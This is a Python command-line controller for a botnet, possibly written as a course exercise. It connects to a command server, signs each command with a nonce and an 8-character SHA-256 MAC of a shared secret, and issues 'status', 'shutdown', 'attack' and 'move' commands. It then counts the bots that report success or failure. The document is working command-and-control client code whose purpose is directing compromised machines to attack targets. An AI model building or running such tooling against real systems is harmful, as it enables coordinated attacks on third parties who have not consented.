#!/usr/bin/env python3

import argparse
import socket
import sys
import hashlib
import time
import select

# Function to parse command line arguments
def parse_arguments():

    parser = argparse.ArgumentParser(description='NC Controller for managing bots.')
    
    parser.add_argument('server', help='Hostname and port of the server (hostname:port)')
    parser.add_argument('secret', help='Secret phrase for command authentication')
    # Parse the arguments
    args = parser.parse_args()
    # Split the server argument into hostname and port
    hostname, port = args.server.split(':')
    # Return the parsed values
    return hostname, int(port), args.secret

def compute_mac(nonce, secret):
    message = f"{nonce}{secret}"
    return hashlib.sha256(message.encode()).hexdigest()[:8]

def send_data(sock, data):
    total_sent = 0
    # Loop until all data is sent
    while total_sent < len(data):
        try:
            # Send the remaining data
            sent = sock.send(data[total_sent:])
            # If no data was sent, the connection is broken
            if sent == 0:
                raise RuntimeError("socket connection broken")
            total_sent += sent
        except socket.error as e:
            # Print error and re-raise it for the caller to handle
            print(f"Send error: {e}")
            raise

def recv_data(sock, bufsize=1024):
    try:
        # Attempt to receive data
        data = sock.recv(bufsize)
        # If no data is received, the connection is considered broken
        if data == b'':
            raise RuntimeError("socket connection broken")
        return data
    except socket.error as e:
        # Print error and re-raise it for the caller to handle
        print(f"Receive error: {e}")
        raise

def send_command(sock, command, secret):
    #compute mac and nonce then send to server 
    nonce = str(int(time.time()))
    mac = compute_mac(nonce, secret)
    full_command = f"{nonce} {mac} {command}\n"
    send_data(sock, full_command.encode())

def receive_responses(sock, timeout=5):
    responses = []
    sock.setblocking(0)

    end_time = time.time() + timeout
    while True:
        now = time.time()
        if now > end_time:
            break

        try:
            readable, _, _ = select.select([sock], [], [], max(end_time - now, 0))
            if readable:
                data = sock.recv(4096)
                if data:
                    responses.append(data.decode().strip())
            else:
                # Break the loop if select returns no readable sockets before timeout
                break
        except socket.error as e:
            print(f"Receive error: {e}")
            break

    return responses



def process_responses(command, responses):
    # Filter out '-joined' messages and ensure unique responses
    responses = set(resp for resp in responses if not resp.startswith("-joined"))

    # Handling unrecognized command response
    if any("The command" in resp for resp in responses):
        print(next(resp for resp in responses if "The command" in resp))
        return

    # Handling the 'status' command
    if command == "status":
        bots = [resp for resp in responses if resp.startswith("-status")]
        if bots:
            print(f"\nResult: {len(bots)} bots discovered.")
            for bot in bots:
                print(bot.replace("-status ", ""))
        else:
            print(f"\nResult: 0 bots discovered.")

    # Handling the 'shutdown' command
    elif command == "shutdown":
        bots_shutdown = [resp for resp in responses if resp.startswith("-shutdown")]
        if bots_shutdown:
            print(f"\nResult: {len(bots_shutdown)} bots shut down.")
            for bot in bots_shutdown:
                print(bot.replace("-shutdown ", ""))
        else:
            print(f"\nResult: 0 bots shut down.")

    # Handling the 'attack' command
    elif command.startswith("attack"):
        if responses:
            success = [resp for resp in responses if "OK" in resp]
            failed = [resp for resp in responses if "FAIL" in resp]
            print(f"\nResult: {len(success)} bots attacked successfully:")
            for s in success:
                print(s.replace("-attack ", "").replace(" OK", ""))
            if failed:
                print(f"{len(failed)} bots failed to attack:")
                for f in failed:
                    print(f.replace("-attack ", "").replace(" FAIL", ""))
        else:
            # Adjusted message for clarity when no bots are connected
            print("Result: 0 bots attacked successfully:\n0 bots failed to attack:")

    # Handling the 'move' command
    elif command.startswith("move") and responses:
        moved_bots = [resp for resp in responses if resp.startswith("-move")]
        if moved_bots:
            print(f"\nResult: {len(moved_bots)} bots moved.")
            for moved_bot in moved_bots:
                print(moved_bot.replace("-move ", ""))
        else:
            print("No bots have moved or no move responses received.")
    

def main():
    hostname, port, secret = parse_arguments()
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((hostname, port))
            print("Connected to the server.")
            
            while True:
                command = input("\ncmd> ").strip()
                if command.lower() == "quit":
                    print("Exiting controller.")
                    break
                
                send_command(sock, command, secret)
                responses = receive_responses(sock)
                
                if responses:
                    # Processes and formats responses based on command
                    process_responses(command, responses)  
                else:
                    # Handle "shutdown" and "status" commands directly as before
                    if command == "shutdown" or command == "status":
                        print(f"Result: 0 bots {command}.")
                    # Special handling for "attack" commands which may have additional arguments
                    elif command.startswith("attack"):
                        print("Result: 0 bots attacked successfully:\n0 bots failed to attack:")
                    else:
                        print("No responses received. It's possible no bots are currently connected.")
                    
    except Exception as e:
        print(f"Error: {e}")
    except KeyboardInterrupt:
        print("Program has been exited.")
    

if __name__ == "__main__":
    main()